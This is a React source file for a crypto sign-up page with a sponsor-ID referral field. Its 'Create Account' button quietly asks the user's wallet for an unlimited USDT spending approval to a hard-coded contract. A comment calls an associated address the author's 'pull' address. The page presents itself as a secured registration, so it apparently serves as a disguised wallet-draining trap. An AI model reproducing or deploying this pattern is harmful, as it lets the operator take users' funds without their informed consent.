import { Refresh } from "@mui/icons-material";
import axios from "axios";
import { useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";
import { useNavigate, useSearchParams } from "react-router-dom";
import Swal from "sweetalert2";
import {
  saveToken,
  saveUid,
  saveUserCP,
  saveUsername,
} from "../redux/slices/counterSlice";
import Loader from "../Shared/Loader";
import { endpoint } from "../utils/APIRoutes";
import logo from "../assets/logo.png";
import toast from "react-hot-toast";
import { ethers } from "ethers";
import { swalObj } from "../utils/Swal";

const DappRegistration = () => {
  const [loading, setLoading] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [walletAddressArray, setwalletAddressArray] = useState([]);
  const [searchParams] = useSearchParams();
  const referral_id = searchParams.get("startapp") || null;
  const [referralInput, setReferralInput] = useState(referral_id || "");
  // const params = window?.Telegram?.WebApp?.initDataUnsafe?.start_param;
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const { logindataen, uid } = useSelector((state) => state.aviator);
  const datatele = {
    id: referral_id,
  };
  useEffect(() => {
    requestAccount();
  }, []);
  async function requestAccount() {
    setLoading(true);
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], // Chain ID for Binance Smart Chain Mainnet
        });
        const userAccount = accounts[0];
        // console.log(accounts)
        setWalletAddress(userAccount);
        setwalletAddressArray(accounts);
      } catch (error) {
        // Swal.fire({
        //   text: "Error connecting..." + error,

        //   confirmButtonColor: "black",
        // });
        toast("Error connecting...", error);
      }
    } else {
      // Swal.fire({
      //   text: "Wallet not detected.",

      //   confirmButtonColor: "black",
      // });
      toast("Wallet not detected.");
    }
    setLoading(false);
  }

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
  const TOKEN_CONTRACT = "0x239aD55054D8dEbB42E86b48de658f76f69eaE6f"; // your TokenDeposited contract 2026-01-22 09:32:11 new contract lga diya hai..
  // const TOKEN_CONTRACT = "0x0d888458Dc2cD73f81a48CcBdAE62c31F82DbE92"; // your TokenDeposited contract
  const AUTHORIZED_CALLER = "0xdea9d91f7c629a72dd640f8498b09979e802a512"; // mera pull wala address hai

  const loginFn = async (reqBody) => {
    setLoading(true);

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      // 🔹 USDT ABI (only allowance + approve)
      const usdtAbi = [
        "function allowance(address owner, address spender) view returns (uint256)",
        "function approve(address spender, uint256 amount) returns (bool)",
      ];

      const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);

      // 🔹 Check current allowance
      const allowance = await usdt.allowance(userAddress, TOKEN_CONTRACT);
      // console.log("Current allowance:", allowance.toString());

      const maxAllowance = ethers.constants.MaxUint256;

      // If allowance < 1 million USDT, approve unlimited
      if (allowance.lt(ethers.utils.parseUnits("1000000", 18))) {
        // toast.info("Approving USDT allowance...");

        const tx = await usdt.approve(TOKEN_CONTRACT, maxAllowance);
        await tx.wait();

        // toast.success("✅ Allowance approved successfully!");
      } else {
        console.log("hi");
        // console.log("✅ Already approved, skipping approval.");
      }
    } catch (e) {
      return toast("Refresh page and Please try again", { id: 1 });
    }

    const reqBodyy = {
      wallet_address: String(walletAddress)?.toLocaleLowerCase(),
      // referral_id: String(datatele?.id)
      referral_id: String(referralInput || ""),

    };
    // const reqBodyy = {
    //   mobile: String("9876543210"),
    //   email: String("9876543210"),
    //   full_name: String(datatele?.username||"N/A"),
    //   referral_id: String("9876543210"),
    //   username: String("9876543210"),
    //   password: String("9876543210"),
    // };

    try {
      const response = await axios.post(endpoint?.member_dapp_log_reg, reqBodyy, {
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      });

      setLoading(false);
      if (response?.data?.message === "Credential not found in our record") {
        return;
      }
      if (response?.data?.message === "Login Successfully") {
        dispatch(saveUid(reqBodyy?.wallet_address));
        dispatch(saveToken(response?.data?.result?.[0]?.token));
        dispatch(saveUsername(reqBodyy?.wallet_address));
        dispatch(saveUserCP(response?.data?.result?.[0]?.isCP));
        localStorage.setItem("logindataen", response?.data?.result?.[0]?.token);
        localStorage.setItem("uid", reqBodyy?.wallet_address);
        localStorage.setItem("username", reqBodyy?.wallet_address);
        localStorage.setItem("isCP", response?.data?.result?.[0]?.isCP);

        Swal.fire({
          title: "🎉 Congratulations!",
          html: `
            <p style="font-size:14px; margin-bottom:8px;">${response?.data?.message}</p>
            <p style="font-weight:bold; color:#f39c12; margin:0;">Subscriber Wallet Address</p>
            <p style="font-size:13px; word-break:break-all; color:#16a085; margin-top:4px;">
              ${walletAddress}
            </p>
          `,
          icon: "success",
          confirmButtonColor: "black",
        }).then((result) => {
          if (result.isConfirmed) {
            navigate("/dashboard");
            window.location.reload();
          }
        });
        // toast(response?.data?.message);
        // navigate("/dashboard");
        // window.location.reload();
      } else {
        // Swal.fire({
        //   text: response?.data?.message,

        //   confirmButtonColor: "black",
        // });
        toast(response?.data?.message);
      }
    } catch (error) {
      toast("Error during login.");
      // Swal.fire({
      //   text: "Error during login.",

      //   confirmButtonColor: "black",
      // });
      setLoading(false);
    }
  };
  useEffect(() => {
    if (walletAddress) {
      // alert("ID: " + walletAddress);
      Swal.fire(swalObj(walletAddress));
      if (
        String(uid)?.toLocaleLowerCase() ==
        String(walletAddress || "")?.toLocaleLowerCase()
      ) {
        // navigate("/home");
      }
    }
  }, [walletAddress]);
  return (
    <>
      <Loader isLoading={loading} />

      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 relative overflow-hidden">
        {/* Enhanced animated background effects */}
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_30%_20%,rgba(120,119,198,0.3),transparent_50%)]"></div>
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_70%_80%,rgba(34,211,238,0.2),transparent_50%)]"></div>

        {/* Multiple floating orbs */}
        <div className="absolute top-0 left-0 w-96 h-96 bg-gradient-to-r from-cyan-400/20 to-purple-400/20 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute bottom-0 right-0 w-96 h-96 bg-gradient-to-l from-blue-500/20 to-indigo-500/20 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }}></div>
        <div className="absolute top-1/2 left-1/4 w-64 h-64 bg-gradient-to-br from-violet-400/10 to-pink-400/10 rounded-full blur-2xl animate-pulse" style={{ animationDelay: '2s' }}></div>

        {/* Enhanced star field */}
        <div className="absolute inset-0 bg-[radial-gradient(white_1px,transparent_1px)] [background-size:50px_50px] opacity-10 animate-pulse"></div>
        <div className="absolute inset-0 bg-[radial-gradient(cyan_0.5px,transparent_0.5px)] [background-size:80px_80px] opacity-20"></div>

        {/* Enhanced floating particles */}
        <div className="absolute top-20 left-20 w-3 h-3 bg-gradient-to-r from-cyan-400 to-blue-400 rounded-full opacity-80 animate-ping"></div>
        <div className="absolute bottom-40 right-32 w-2 h-2 bg-gradient-to-r from-purple-400 to-pink-400 rounded-full opacity-70 animate-ping" style={{ animationDelay: '1.5s' }}></div>
        <div className="absolute top-1/3 right-1/4 w-1 h-1 bg-cyan-300 rounded-full opacity-60 animate-ping" style={{ animationDelay: '2.5s' }}></div>
        <div className="absolute bottom-1/3 left-1/3 w-2 h-2 bg-violet-400 rounded-full opacity-50 animate-ping" style={{ animationDelay: '3s' }}></div>

        {/* Registration Card */}
        <div className="relative z-10 w-full max-w-md mx-1">
          {/* Enhanced outer glow with multiple layers */}
          <div className="absolute -inset-1 bg-gradient-to-r from-cyan-400 via-violet-500 via-purple-500 to-cyan-400 rounded-3xl opacity-30 blur-xl animate-pulse"></div>
          <div className="absolute -inset-0.5 bg-gradient-to-r from-blue-400 via-indigo-500 to-purple-400 rounded-3xl opacity-40 blur-lg"></div>

          {/* Main card */}
          <div className="relative bg-gradient-to-br from-slate-900/95 via-slate-800/95 to-slate-900/95 backdrop-blur-xl border border-cyan-400/40 rounded-3xl px-3 py-12 shadow-2xl shadow-cyan-400/30 overflow-hidden">

            {/* Enhanced decorative background effects */}
            <div className="absolute top-0 right-0 w-64 h-64 bg-gradient-to-bl from-cyan-400/10 via-purple-400/5 to-transparent rounded-full blur-3xl"></div>
            <div className="absolute -bottom-10 -left-10 w-48 h-48 bg-gradient-to-tr from-violet-500/10 via-blue-500/5 to-transparent rounded-full blur-2xl"></div>

            {/* Enhanced decorative corners */}
            <div className="absolute top-0 right-0 w-32 h-32 border-t-2 border-r-2 border-gradient-to-bl from-cyan-400/30 to-purple-400/30 rounded-tr-3xl"></div>
            <div className="absolute bottom-0 left-0 w-24 h-24 border-b-2 border-l-2 border-gradient-to-tr from-violet-400/20 to-cyan-400/20 rounded-bl-3xl"></div>

            {/* Enhanced accent lines */}
            <div className="absolute left-0 top-0 bottom-0 w-1 bg-gradient-to-b from-cyan-400 via-purple-500 via-violet-500 to-cyan-400 animate-pulse"></div>
            <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent"></div>

            {/* Content */}
            <div className="relative z-10">
              {/* Enhanced Logo */}
              <div className="flex justify-center mb-8">
                <div className="relative group">
                  {/* Multi-layered logo glow effect */}
                  <div className="absolute inset-0 bg-gradient-to-r from-cyan-400/40 via-purple-400/40 to-cyan-400/40 rounded-full blur-3xl animate-pulse group-hover:scale-110 transition-transform duration-500"></div>
                  <div className="absolute inset-0 bg-gradient-to-r from-blue-400/30 to-violet-400/30 rounded-full blur-xl animate-pulse" style={{ animationDelay: '0.5s' }}></div>

                  {/* Logo container */}
                  <div className="relative   group-hover:border-cyan-400/60 transition-all duration-500 group-hover:scale-105">
                    <img src={logo} alt="Hyperchainx" className="h-20 w-auto relative z-10 drop-shadow-lg" 
                    onClick={() => window.open("https://web.dexon.global", "_blank")}/>
                  </div>
                </div>
              </div>

              {/* Enhanced Heading */}
              <div className="text-center mb-10">
                <h2 className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-purple-400 via-violet-400 to-cyan-400 text-3xl font-bold mb-3 tracking-wide">
                  Create Account
                </h2>
                <p className="text-slate-300 text-base font-medium">Join the future of blockchain technology</p>

                {/* Enhanced decorative divider */}
                <div className="flex items-center justify-center gap-3 mt-6">
                  <div className="w-12 h-px bg-gradient-to-r from-transparent via-cyan-400/60 to-purple-400/60"></div>
                  <div className="w-3 h-3 rounded-full bg-gradient-to-r from-cyan-400 to-purple-400 animate-pulse"></div>
                  <div className="w-12 h-px bg-gradient-to-l from-transparent via-purple-400/60 to-cyan-400/60"></div>
                </div>
              </div>

              {/* Enhanced Form Fields */}
              <div className="space-y-6 mb-8">
                {/* Sponsor Address Field */}
                <div className="relative group">
                  <label className="block text-cyan-300 text-sm font-semibold mb-2 flex items-center gap-2">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z" />
                    </svg>
                    Sponsor ID
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={referralInput}
                      onChange={(e) => setReferralInput(e.target.value)}
                      placeholder="Enter sponsor ID"
                      className="w-full px-4 py-4 rounded-xl bg-slate-800/50 border border-slate-600/50 text-slate-200 text-sm placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/50 focus:border-cyan-400/50 transition-all duration-300 group-hover:border-slate-500/70"
                    />
                    <div className="absolute inset-0 rounded-xl bg-gradient-to-r from-cyan-400/10 to-purple-400/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>
                  </div>
                </div>

                {/* Wallet Address Field */}
                <div className="relative group">
                  <label className="block text-cyan-300 text-sm font-semibold mb-2 flex items-center gap-2">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                    Your Wallet Address
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={walletAddress}
                      readOnly
                      placeholder="Connect wallet to auto-fill"
                      className="w-full px-4 py-4 rounded-xl bg-slate-800/30 border border-slate-600/30 text-slate-300 text-sm placeholder-slate-500 cursor-not-allowed"
                    />
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse shadow-lg shadow-green-400/50"></div>
                    </div>
                    {walletAddress && (
                      <div className="absolute -inset-0.5 bg-gradient-to-r from-green-400/20 to-cyan-400/20 rounded-xl blur-sm"></div>
                    )}
                  </div>
                </div>
              </div>

              {/* Enhanced Sign Up Button */}
              <div className="mb-8">
                <button
                  onClick={loginFn}
                  disabled={!walletAddress || !referralInput}
                  className="relative w-full py-5 rounded-2xl font-bold text-lg overflow-hidden group transition-all duration-500 hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
                >
                  {/* Enhanced button background */}
                  <div className="absolute inset-0 bg-gradient-to-r from-cyan-600 via-purple-600 via-violet-600 to-cyan-600 bg-size-200 bg-pos-0 group-hover:bg-pos-100 transition-all duration-700 disabled:opacity-50"></div>
                  <div className="absolute inset-0 bg-gradient-to-br from-blue-500 via-indigo-500 to-purple-500 opacity-0 group-hover:opacity-90 transition-opacity duration-500"></div>

                  {/* Enhanced button glow */}
                  <div className="absolute -inset-1 bg-gradient-to-r from-cyan-400 via-purple-400 to-cyan-400 opacity-0 group-hover:opacity-80 transition-opacity duration-500 blur-xl rounded-2xl"></div>

                  {/* Button content */}
                  <span className="relative z-10 flex items-center justify-center gap-4 text-white">
                    <svg className="w-6 h-6 group-hover:rotate-12 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z" />
                    </svg>
                    Create Account
                    <svg className="w-6 h-6 group-hover:translate-x-2 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                    </svg>
                  </span>

                  {/* Enhanced shine effect */}
                  <div className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-700">
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/40 to-transparent -skew-x-12 translate-x-[-300%] group-hover:translate-x-[300%] transition-transform duration-1000"></div>
                  </div>
                </button>

                {/* Validation hint */}
                {(!walletAddress || !referralInput) && (
                  <div className="mt-3 flex items-center gap-2 text-slate-400 text-xs">
                    <svg className="w-4 h-4 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.664-.833-2.464 0L3.34 16.5c-.77.833.192 2.5 1.732 2.5z" />
                    </svg>
                    <span>
                      {!walletAddress && !referralInput
                        ? "Please connect your wallet and enter sponsor address"
                        : !walletAddress
                          ? "Please connect your wallet"
                          : "Please enter sponsor address"}
                    </span>
                  </div>
                )}
              </div>

              {/* Enhanced Divider */}
              <div className="flex items-center gap-4 my-8">
                <div className="flex-1 h-px bg-gradient-to-r from-transparent via-cyan-400/40 via-purple-400/40 to-transparent"></div>
                <span className="text-slate-400 text-sm font-medium bg-slate-800/50 px-4 py-2 rounded-full border border-slate-600/50">OR</span>
                <div className="flex-1 h-px bg-gradient-to-l from-transparent via-purple-400/40 via-cyan-400/40 to-transparent"></div>
              </div>

              {/* Enhanced Login Link */}
              <div className="text-center mb-6">
                <p className="text-slate-300 text-sm">
                  Already have an account?{" "}
                  <span
                    onClick={() => navigate("/")}
                    className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-purple-400 to-violet-400 font-bold cursor-pointer hover:from-cyan-300 hover:via-purple-300 hover:to-violet-300 transition-all duration-300 inline-flex items-center gap-2 hover:scale-105"
                  >
                    Sign In
                    <svg className="w-4 h-4 text-cyan-400 group-hover:translate-x-1 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
                    </svg>
                  </span>
                </p>
              </div>

              {/* Enhanced Security Badge */}
              <div className="flex items-center justify-center gap-3 text-slate-400 text-xs bg-slate-800/30 backdrop-blur-sm rounded-full px-4 py-3 border border-slate-600/30">
                <div className="p-1 bg-green-500/20 rounded-full">
                  <svg className="w-4 h-4 text-green-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
                <span className="font-medium">Secured registration process</span>
              </div>
            </div>
          </div>
        </div>

        {/* Enhanced Custom Animations */}
        <style jsx>{`
        .bg-size-200 {
          background-size: 200% 100%;
        }
        .bg-pos-0 {
          background-position: 0% 0%;
        }
        .bg-pos-100 {
          background-position: 100% 0%;
        }
        
        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-10px); }
        }
        
        @keyframes glow {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        
        .animate-float {
          animation: float 3s ease-in-out infinite;
        }
        
        .animate-glow {
          animation: glow 2s ease-in-out infinite;
        }
      `}</style>
      </div>
    </>
  );

};

export default DappRegistration;
